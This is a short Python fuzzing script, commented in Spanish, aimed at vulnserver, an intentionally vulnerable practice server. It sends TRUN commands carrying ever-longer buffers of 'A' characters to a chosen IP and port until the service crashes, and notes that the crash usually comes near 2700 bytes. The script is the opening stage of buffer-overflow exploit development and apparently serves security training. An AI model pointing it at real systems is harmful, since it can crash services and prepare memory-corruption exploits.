import sys, socket, time

#Este script esta diseñado para vulnserver

payload="A" * 100 

ip="10.0.0.0" #Cambia la direccion IP a la que necesites
port=5555 #Cambia el puerto al que necesites

while True:
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            
            s.send(bytes("TRUN /.:/" + payload,"latin-1")) #El string de TRUN puedes cambiarlo a otro comando si quieres
            s.close()
            time.sleep(1)
            payload+="A" * 100 #Por lo general TRUN crashea con alrededor 2700 bytes
        
        except:
                print("Fuzzing completado con %s bytes aprox." % str(len(payload)))
                sys.exit(0)